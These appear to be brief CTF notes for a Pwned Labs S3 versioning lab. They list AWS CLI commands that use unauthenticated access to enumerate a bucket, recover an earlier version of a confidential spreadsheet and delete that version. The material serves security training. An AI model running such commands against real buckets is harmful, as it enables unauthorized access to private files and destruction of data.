 Challege Link: https://pwnedlabs.io/labs/access-secrets-with-s3-bucket-versioning
2. Challenge Name: Access Secrets with S3 Bucket Versioning
3. Some useful commands during the CTF challenge: 
	1. aws s3 ls s3://huge-logistics-dashboard --recursive --no-sign-request
	2. aws s3api list-object-versions --bucket huge-logistics-dashboard --query "Versions[?VersionId!='null']" --no-sign-request
	3. aws s3api get-object --bucket huge-logistics-dashboard --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id "HPnPmnGr_j6Prhg2K9X2Y.OcXxlO1xm8" test.xlsx --no-sign-request
	4. aws s3api delete-object --bucket huge-logistics-dashboard --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id "HPnPmnGr_j6Prhg2K9X2Y.OcXxlO1xm8" 
